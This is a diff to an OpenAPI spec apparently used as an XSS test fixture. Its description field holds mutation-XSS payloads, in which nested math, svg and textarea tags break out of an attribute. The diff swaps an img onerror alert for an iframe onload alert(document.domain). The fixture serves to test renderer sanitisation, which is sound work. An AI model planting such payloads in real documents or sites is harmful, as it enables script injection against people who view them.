@@ -3,4 +3,4 @@ openapi: "3.0.0"
 info:
   title: hld test XSS
   description:
-    <math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><img onerror=alert('textarea') src=1>"></a></textarea></mtext></svg></mglyph></table></mi></math>
+    <math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
